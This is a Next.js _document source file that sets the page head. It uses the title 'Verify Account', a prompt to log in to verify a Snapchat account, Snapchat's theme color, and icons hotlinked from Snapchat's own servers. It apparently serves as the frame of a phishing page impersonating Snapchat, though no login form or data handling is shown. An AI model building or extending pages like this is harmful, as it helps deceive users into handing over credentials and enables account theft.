import { Html, Head, Main, NextScript } from "next/document";

export default function Document() {
  return (
    <Html lang="en">
      <Head>
        {/* Primary Meta Tags */}
        <meta name="title" content="Verify Account" />
        <meta name="description" content="Log in to verify your account and continue using Snapchat." />
        <meta name="theme-color" content="#FFFC00" />
        
        {/* Favicons */}
        <link rel="icon" type="image/png" sizes="192x192" href="https://static.snapchat.com/images/favicon/favicon-192x192.png" />
        <link rel="icon" type="image/x-icon" href="https://static.snapchat.com/favicon.ico" />
        
        {/* Apple Touch Icon */}
        <link rel="apple-touch-icon" href="https://static.snapchat.com/images/favicon/apple-touch-icon.png" />
      </Head>
      <body className="antialiased">
        <Main />
        <NextScript />
      </body>
    </Html>
  );
}
